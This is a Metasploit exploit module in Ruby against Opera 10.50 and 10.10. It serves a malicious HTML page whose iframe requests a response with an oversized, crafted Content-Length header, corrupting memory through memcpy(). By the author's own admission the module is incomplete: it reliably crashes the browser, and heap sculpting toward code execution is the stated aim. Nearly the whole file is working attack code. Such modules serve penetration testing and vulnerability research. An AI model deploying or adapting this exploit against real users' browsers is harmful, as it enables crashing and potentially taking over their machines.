##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,{
			'Name'           => '[INCOMPLETE] Opera <= 10.50 Content-Length Memory Corruption',
			'Description'    => %q{
					This module triggers a vulnerability in Opera 10.50 and 10.10 that allows
				an attacker to specify the copy length for a memcpy(). See references for more 
				information.

				In its current state, this module is only capable of causing a crash. With 
				some heap sculpting it is reportedly possible to cause code execution instead.
				Unforatunately, I have not been able to achieve code exec yet :-/
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'jduck' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://www.hack0wn.com/view.php?xroot=672.0&cat=exploits' ],
					[ 'URL', 'http://secunia.com/blog/86/' ],
					[ 'URL', 'http://my.opera.com/securitygroup/blog/2010/03/09/the-malformed-content-length-header-security-issue' ]
				],
			'Payload'        =>
				{
					'ExitFunc' => 'process',
					'Space'    => 2048,
					'BadChars' => "",
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'Opera 10.50 on Windows XP SP3',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
							'Ret'        => 0x0c0c0c0c,
							'BlockLen'   => 0x60000,
							'Containers' => 800,
						}
					],
				],
			'DisclosureDate' => 'Mar 03 2010',
			'DefaultTarget' => 0
			}))
	end

	def on_request_uri(cli, request)
		print_status("Got request for: #{request.uri}")
		#print_status(request.inspect)

		# Re-generate the payload
		#return if ((p = regenerate_payload(cli)) == nil)


		# Send the trigger when requested..
		if (request.uri =~ /boom$/)
			len = rand(0x7000)
			# below will force a crash every time
			#len = 0x0c0c0c0c
			print_status("Using length: %d" % len)

			bignum = 11111111111111111111 - 3047977415
			bignum += len

			content = "A" * 10240

			response = ""
			response << "HTTP/#{request.proto} 200 OK\r\n"
			response << "Content-Type: text/html\r\n"
			response << "Content-Length: #{bignum}\r\n"
			response << "\r\n"
			response << content

			print_status("Sending #{self.name} trigger to #{cli.peerhost}:#{cli.peerport}...")
			cli.put(response)

			return
		end


		# Otherwise, setup the heap to get pwnt...
		print_status("Sending #{self.name} HTML to #{cli.peerhost}:#{cli.peerport}...")
		html = %Q|<html>
<head>
<!-- <meta http-equiv="refresh" content="1" /> -->
<script language=javascript>
function boom()
{
	/*
 var i;
 for (i = 0; i < 10000; i++)
 {
  var im = document.createElement('IMG');
  var id = 'img'+i.toString();
  im.setAttribute('id', id);
  im.setAttribute('height', '10');
  im.setAttribute('width', '10');
  im.onmouseover = function(event)
  { 
    var im=event.currentTarget
	 im.src = 'http://qoop.org/media/dep-haha.gif';
  };
  document.body.appendChild(im);
 }
    */
 var ifr = document.createElement('IFRAME');
 ifr.src = 'REPLACE_ME';
 document.body.appendChild(ifr);
}
</script>
</head>
<body onload="boom()">
</body>
</html>
|

		trigger_url = get_resource() + '/boom'
		html.gsub!(/REPLACE_ME/, trigger_url)

		send_response_html(cli, html)

		handler(cli)
	end

end
